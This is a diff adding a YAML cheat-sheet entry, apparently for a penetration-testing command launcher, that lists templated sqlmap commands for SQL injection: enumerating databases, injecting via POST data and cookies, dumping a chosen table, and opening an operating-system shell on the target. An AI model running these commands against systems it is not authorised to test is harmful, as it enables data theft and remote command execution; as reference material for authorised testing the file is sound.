@@ -1,0 +1,19 @@
+---
+tool: sqlmap
+description: Automated SQL injection with sqlmap
+
+actions:
+  - title: url
+    command: "sqlmap -u 'http://{{rhost}}/?id=1' --batch"
+  - title: url-dbs
+    command: "sqlmap -u 'http://{{rhost}}/?id=1' --batch --dbs"
+  - title: request-file
+    command: "sqlmap -r request.txt --batch"
+  - title: post-data
+    command: "sqlmap -u 'http://{{rhost}}/' --data='username={{un}}&password={{pw}}' --batch"
+  - title: cookie
+    command: "sqlmap -u 'http://{{rhost}}/' --cookie='<NAME>=<VALUE>' --batch"
+  - title: dump
+    command: "sqlmap -u 'http://{{rhost}}/?id=1' --batch -D {{db}} -T {{table}} --dump"
+  - title: os-shell
+    command: "sqlmap -u 'http://{{rhost}}/?id=1' --batch --os-shell"
